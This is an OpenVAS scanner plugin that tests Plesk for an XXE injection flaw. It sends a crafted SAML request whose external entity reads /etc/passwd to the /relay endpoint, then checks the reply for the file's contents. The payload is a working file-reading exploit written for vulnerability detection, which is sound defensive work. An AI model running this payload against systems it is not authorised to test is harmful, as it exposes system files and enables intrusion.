##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_plesk_xxe_06_13.nasl 6756 2017-07-18 13:31:14Z cfischer $
#
# Plesk XXE Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:parallels:parallels_plesk_panel";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.105046");
 script_version ("$Revision: 6756 $");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

 script_name("Plesk XXE Injection Vulnerability");

 script_xref(name:"URL", value:"http://makthepla.net/blog/=/plesk-sso-xxe-xss");
 
 script_tag(name:"last_modification", value:"$Date: 2017-07-18 15:31:14 +0200 (Tue, 18 Jul 2017) $");
 script_tag(name:"creation_date", value:"2014-06-13 14:56:42 +0200 (Fri, 13 Jun 2014)");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("gb_plesk_detect.nasl");
 script_require_ports("Services/www", 8443);
 script_mandatory_keys("plesk/installed");

 script_tag(name : "impact" , value : "An attacker can exploit this vulnerability to retrieve arbitrary files
 from the vulnerable system or to execute code in the context of the affected application.");
 script_tag(name : "vuldetect" , value : "Send a special crafted HTTP POST request and check the response.");
 script_tag(name : "solution" , value : "Ask the vendor for an update.");
 script_tag(name : "summary" , value : "Plesk is prone to a XXE Vulnerability.");
 script_tag(name : "affected" , value : "Plesk versions 10.4.4 and 11.0.9; other versions may also be affected.");

 script_tag(name:"qod_type", value:"remote_app");

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");
include("url_func.inc");

if ( ! port = get_app_port( cpe:CPE ) ) exit( 0 );

xxe = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE doc [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ] >' + 
      '<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"' + 
      'ID="' +  rand_str( length:42, charset:'a-f0-9')  + '" Version="2.0">' + 
      '<saml:Issuer>&xxe;</saml:Issuer></samlp:AuthnRequest>';

xxe = urlencode( str:base64( str:xxe ) );

host = http_host_name(port:port);

rs = urlencode( str:base64( str:get_host_ip() ) );

ex = 'SAMLRequest=' + xxe  + '&response_url=http://OpenVAS&RelayState=' + rs  + '&RefererScheme=https&RefererHost=https://' + host + '&RefererPort=' + port;

len = strlen( ex );

req = 'POST /relay HTTP/1.1\r\n' +
      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' + 
      'Host: ' + host + '\r\n' + 
      'Accept: */*\r\n' + 
      'Referer: https://' + host + '/relay\r\n' +
      'Content-Length: ' + len + '\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' + 
      '\r\n' +
      ex;

buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if( buf =~ 'root:.*:0:[01]:' )
{
  security_message( port:port );
  exit( 0 );
}

exit( 99 );

